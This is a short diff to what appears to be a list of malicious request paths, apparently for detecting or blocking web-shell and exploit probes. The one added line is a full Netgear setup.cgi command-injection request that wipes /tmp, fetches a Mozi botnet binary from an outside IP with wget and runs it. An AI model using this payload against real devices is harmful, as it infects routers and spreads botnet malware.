@@ -19394,3 +19394,4 @@ http://www.google.com/
 /images/images/cache.php?pass=3a0e007c895888c9c4bf234e2772a0dd
 /admin/style.php
 /wp-content/plugins/sid/sidwso.php/vuln.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.137.194.2:38930/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
